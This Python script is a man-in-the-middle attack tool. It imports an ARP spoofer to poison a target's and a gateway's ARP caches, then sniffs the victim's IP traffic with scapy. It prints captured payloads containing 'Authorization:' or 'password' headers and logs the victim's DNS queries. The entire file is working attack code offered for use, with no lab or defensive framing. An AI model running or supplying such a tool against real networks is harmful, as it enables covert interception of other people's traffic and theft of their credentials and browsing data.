#!/usr/bin/env python3
"""
MITM Packet Sniffer + ARP Spoofer
Captures and optionally modifies traffic between target and gateway
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import scapy.all as scapy
import threading
import argparse
from colorama import Fore, init

# Import ARPSpoofer with error handling
try:
    from ARP_Spoofer import ARPSpoofer
except ImportError:
    print("[ERROR] ARP_Spoofer.py not found in the same directory!")
    print("Make sure both ARP_Spoofer.py and mitm_interceptor.py are in the same folder")
    sys.exit(1)

init(autoreset=True)

class MITMInterceptor(ARPSpoofer):
    """Extends ARPSpoofer with packet sniffing capabilities"""
    
    def __init__(self, target_ip, spoof_ip, interface=None, output_file=None):
        super().__init__(target_ip, spoof_ip, interface)
        self.output_file = output_file
        self.packets_captured = 0
    
    def packet_callback(self, packet):
        """Callback for packet sniffing"""
        if scapy.IP in packet:
            ip_src = packet[scapy.IP].src
            ip_dst = packet[scapy.IP].dst
            
            # Filter for target traffic
            if ip_src == self.target_ip or ip_dst == self.target_ip:
                self.packets_captured += 1
                
                # HTTP packet detection
                if scapy.Raw in packet:
                    payload = bytes(packet[scapy.Raw].load)
                    
                    # Look for HTTP credentials
                    if b"Authorization:" in payload or b"password" in payload:
                        print(f"{Fore.RED}[!] Sensitive data detected!")
                        print(f"{Fore.YELLOW}{payload[:100]}")
                
                # DNS detection
                if packet.haslayer(scapy.DNSQR):
                    dns_query = packet[scapy.DNSQR].qname.decode('utf-8')
                    print(f"{Fore.CYAN}[DNS] {dns_query}")
                
                print(f"{Fore.GREEN}[+] {ip_src} ←→ {ip_dst} | Captured: {self.packets_captured}", end='\r')
    
    def start_sniffing(self):
        """Start packet sniffing"""
        print(f"{Fore.CYAN}[*] Starting packet sniffer...")
        scapy.sniff(
            iface=self.interface,
            prn=self.packet_callback,
            store=False,
            filter="ip"
        )


def main():
    parser = argparse.ArgumentParser(description="MITM Packet Sniffer + ARP Spoofer")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("gateway_ip", help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface")
    parser.add_argument("-o", "--output", help="Output file for captured data")
    
    args = parser.parse_args()
    
    try:
        interceptor = MITMInterceptor(args.target_ip, args.gateway_ip, args.interface, args.output)
        
        # Run spoofer in background thread
        spoof_thread = threading.Thread(target=interceptor.spoof, daemon=True)
        spoof_thread.start()
        
        # Run sniffer in main thread
        interceptor.start_sniffing()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Shutting down...")
    except PermissionError:
        print(f"{Fore.RED}[-] This tool requires root privileges! Run with: sudo python3 mitm_interceptor.py")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()